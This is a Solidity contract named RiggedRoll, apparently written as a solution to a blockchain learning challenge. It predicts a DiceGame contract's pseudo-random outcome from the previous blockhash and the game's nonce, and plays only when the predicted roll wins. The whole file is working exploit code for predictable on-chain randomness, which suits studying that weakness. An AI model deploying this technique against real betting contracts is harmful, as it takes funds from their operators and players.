pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

/// @notice Thrown when a failure occurs in withdrawing contract balance
error FailedToWithdraw();

/// @notice Thrown when there is not enough balance in the contract to play the DiceGame
error NotEnoughBalance();

/// @notice Thrown when a specified amount is too large for a given balance
/// @param amount The amount that was attempted to be used
/// @param balance The current balance that the amount was compared to
error AmountIsTooLarge(uint256 amount, uint256 balance);

/// @notice Thrown when a roll in the rigged game fails
error FailedToRoll();

/// @notice Thrown when a call to roll the dice in DiceGame contract fails
error CallingDiceGameRollFailed();

/// @title RiggedRoll
/// @author Indrek Jogi
/// @notice This contract allows for a manipulated roll in the DiceGame
/// @dev This contract inherits from OpenZeppelin's Ownable for owner-only functionality
contract RiggedRoll is Ownable {
  /// @notice The DiceGame contract instance
  DiceGame public diceGame;

  /// @notice Event emitted when a rigged roll has occurred
  /// @param roll The value of the roll
  event RiggRolled(uint256 roll);
  /// @notice Emitted when a withdrawal is made from the contract
  /// @param amount The amount that has been withdrawn
  event Withdrawal(uint256 amount);

  /// @notice Emitted when a roll operation in the DiceGame contract is successfully executed
  event SuccessfulRoll();

  /// @dev Initializes a new instance of the contract and sets the DiceGame contract
  /// @param diceGameAddress The address of the DiceGame contract
  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
  }

  /// @notice Allows the owner to withdraw a specified amount from the contract
  /// @dev Only callable by the owner
  /// @param addr The address to which the amount will be sent
  /// @param amount The amount to be withdrawn from the contract, must be less than or equal to the contract's balance
  function withdraw(address payable addr, uint256 amount) external payable onlyOwner {
    uint256 balance = address(this).balance;
    if (amount > balance) {
      revert AmountIsTooLarge(amount, balance);
    }

    (bool success, ) = addr.call{value: amount}('');
    if (!success) {
      revert FailedToWithdraw();
    }
    emit Withdrawal(amount);
  }

  /// @notice Allows anyone to make a rigged roll by manipulating the randomness
  /// @dev The contract must have a balance of at least 0.002 Ether
  function riggedRoll() external payable {
    if (address(this).balance < 0.002 ether) {
      revert NotEnoughBalance();
    }

    uint256 nonce = diceGame.nonce();
    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;

    emit RiggRolled(roll);

    if (roll > 2) {
      revert FailedToRoll();
    }
    try diceGame.rollTheDice{value: 0.002 ether}() {
      emit SuccessfulRoll();
    } catch {
      revert CallingDiceGameRollFailed();
    }
  }

  /// @notice Function to receive Ether
  /// @dev This is a fallback function which allows the contract to receive Ether
  receive() external payable {}
}
